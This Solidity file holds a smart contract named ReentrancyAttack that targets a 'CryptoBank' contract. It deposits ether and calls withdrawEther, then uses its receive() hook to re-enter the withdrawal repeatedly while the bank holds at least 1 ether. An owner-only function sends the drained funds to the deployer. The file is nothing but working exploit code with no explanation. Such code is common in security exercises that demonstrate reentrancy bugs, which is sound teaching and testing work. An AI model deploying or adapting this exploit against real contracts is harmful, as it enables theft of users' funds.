// SPDX-License-Identifier: MIT

pragma solidity 0.8.34;

import {ICryptoBank} from "./interfaces/ICryptoBank.sol";
import {Ownable} from "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";

contract ReentrancyAttack is Ownable {
    address public cryptoBankAddress;

    constructor(address cryptoBankAddress_) Ownable(msg.sender) {
        cryptoBankAddress = cryptoBankAddress_;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        ICryptoBank(cryptoBankAddress).depositEther{value: msg.value}();
        ICryptoBank(cryptoBankAddress).withdrawEther();
    }

    receive() external payable {
        if (cryptoBankAddress.balance >= 1 ether) {
            ICryptoBank(cryptoBankAddress).withdrawEther();
        }
    }

    function withdrawAttackedFunds() external onlyOwner {
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}
